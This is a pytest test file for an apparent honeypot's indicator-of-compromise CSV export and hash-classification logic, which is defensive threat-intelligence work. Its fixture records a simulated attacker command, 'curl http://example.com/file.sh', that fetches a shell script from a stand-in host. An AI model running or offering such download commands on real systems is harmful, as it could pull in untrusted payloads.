import csv
import sqlite3

from honeycomb.src.analysis.ioc_export import export_iocs_csv
from honeycomb.src.storage.schema import init_db


EXPECTED_FIELDS = [
    "type", "value", "first_seen", "last_seen", "sources", "confidence"
]


def test_export_iocs_to_csv(tmp_path):
    db_path = str(tmp_path / "test.db")
    output_path = tmp_path / "iocs.csv"

    with sqlite3.connect(db_path) as conn:
        init_db(conn)
        conn.executemany(
            """
            INSERT INTO events (
                event_id, ts_utc, src_ip, event_type, url, command, sha256
            ) VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            [
                (
                    "event-1", "2026-10-14T10:00:00+00:00",
                    "1.2.3.4", "cowrie.session.file_download",
                    "http://example.com/file.sh", None, "a" * 64,
                ),
                (
                    "event-2", "2026-10-14T11:00:00+00:00",
                    "1.2.3.4", "cowrie.command.input",
                    None, "curl http://example.com/file.sh", "a" * 64,
                ),
            ],
        )
        conn.commit()

    count = export_iocs_csv(db_path, str(output_path))

    assert count == 3
    assert output_path.exists()

    with output_path.open("r", newline="", encoding="utf-8") as file:
        reader = csv.DictReader(file)
        assert reader.fieldnames == EXPECTED_FIELDS
        rows = list(reader)

    assert len(rows) == 3
    indexed = {(row["type"], row["value"]): row for row in rows}

    ip_row = indexed[("ip", "1.2.3.4")]
    assert ip_row["first_seen"] == "2026-10-14T10:00:00+00:00"
    assert ip_row["last_seen"] == "2026-10-14T11:00:00+00:00"

    url_row = indexed[("url", "http://example.com/file.sh")]
    assert url_row["first_seen"] == "2026-10-14T10:00:00+00:00"
    assert url_row["last_seen"] == "2026-10-14T11:00:00+00:00"

    hash_row = indexed[("sha256", "a" * 64)]
    assert hash_row["confidence"] == "unknown"

    for row in rows:
        assert row["sources"]
        assert row["confidence"]


def test_export_empty_database(tmp_path):
    db_path = str(tmp_path / "empty.db")
    output_path = tmp_path / "empty.csv"

    with sqlite3.connect(db_path) as conn:
        init_db(conn)

    count = export_iocs_csv(db_path, str(output_path))

    assert count == 0
    assert output_path.exists()

    with output_path.open("r", newline="", encoding="utf-8") as file:
        reader = csv.DictReader(file)
        assert reader.fieldnames == EXPECTED_FIELDS
        assert list(reader) == []


def test_hash_status_classification():
    from honeycomb.src.analysis.ioc_export import _hash_status

    assert _hash_status({
        "found": True,
        "last_analysis_stats": {"malicious": 2, "harmless": 5}
    }) == "malicious"

    assert _hash_status({
        "found": True,
        "last_analysis_stats": {"malicious": 0, "suspicious": 0,
                                "harmless": 5, "undetected": 3}
    }) == "clean"

    assert _hash_status({
        "found": True,
        "last_analysis_stats": {"malicious": 0, "suspicious": 1,
                                "harmless": 5}
    }) == "unknown"

    assert _hash_status({
        "found": True,
        "last_analysis_stats": {"timeout": 10, "failure": 2}
    }) == "unknown"

    assert _hash_status({
        "found": False
    }) == "unknown"

    assert _hash_status({
        "error": "Request timed out"
    }) == "unknown"
